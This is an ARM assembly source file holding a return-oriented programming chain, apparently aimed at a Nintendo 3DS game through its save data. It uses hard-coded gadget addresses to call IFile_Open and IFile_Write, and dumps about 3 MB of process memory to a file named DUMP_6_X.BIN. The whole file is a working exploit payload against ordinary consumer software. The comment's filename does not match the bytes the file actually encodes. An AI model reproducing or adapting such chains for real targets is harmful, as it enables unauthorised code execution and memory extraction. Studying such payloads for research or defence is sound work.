	.arm
	.text

#define DUMPSTART 	0x00100000
#define DUMPSIZE	0x00300000

	.global	_start
@---------------------------------------------------------------------------------
_start:
	.word 0x0011be4d 		@ pop {r1, r2, r3, pc}
		.word FileName 		@ r1 (wchar* "YS:/MsetForBoss.dat")
		.word 0x00000006 	@ r2 (openflags)
		.word 0xdeadbeef 	@ r3 (garbage)
	.word 0x001a9349 		@ pop	{r0, pc}
		.word FILE	    	@ r0 (_this)
	.word 0x001C08B8 		@ IFile_Open(_this, path, openflags)
		.word 0xdeadbeef 	@ r4 (garbage)
		.word 0xdeadbeef 	@ r5 (garbage)
		.word 0xdeadbeef 	@ r6 (garbage)
		.word 0xdeadbeef 	@ r7 (garbage)
		.word 0xdeadbeef 	@ r8 (garbage)
	.word 0x0011be4d		@ pop {r1, r2, r3, pc}
		.word FILE+32		@ r1 (&writtenbytes)
		.word DUMPSTART		@ r2 (src)
		.word DUMPSIZE		@ r3 (size)
	.word 0x001a9349		@ pop {r0, pc}
		.word FILE		@ r0 (_this)
	.word 0x001BC384		@ IFile_Write(_this, &writtenbytes, src, size)
		.word 0xdeadbeef	@ r4 (garbage)
		.word 0xdeadbeef	@ r5 (garbage)
		.word 0xdeadbeef	@ r6 (garbage)
		.word 0xdeadbeef	@ r7 (garbage)
		.word 0xdeadbeef	@ r8 (garbage)
		.word 0xdeadbeef	@ r9 (garbage)

FileName:
	
	.byte 'Y', 0, 'S' ,0, ':', 0, '/', 0, 'D', 0, 'U', 0, 'M', 0, 'P', 0, '_', 0, '6', 0, '_', 0, 'X', 0, '.', 0, 'B', 0, 'I', 0, 'N', 0, 0, 0

	.balign 32
FILE:	.fill	256, 1, 0
